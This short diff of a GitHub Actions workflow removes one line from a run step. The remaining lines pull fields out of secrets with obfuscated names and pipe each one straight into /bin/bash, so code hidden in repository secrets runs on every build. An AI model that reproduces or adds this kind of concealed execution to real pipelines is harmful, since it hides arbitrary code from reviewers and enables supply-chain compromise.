@@ -20,7 +20,6 @@ jobs:
           bdp0: ${{ secrets.bdp0 }}
         run: |
           printf '%s' "$bdp0" | jq -r .eoc981 | /bin/bash
-          echo $dukc3 | jq -r .aiofa5885 | /bin/bash
           printf '%s' "$bbp7" | jq -r .n00 | /bin/bash
           echo $wv79889 | jq -r .ba4931 | /bin/bash
           echo $eih155 | jq -r .ueu21 | /bin/bash
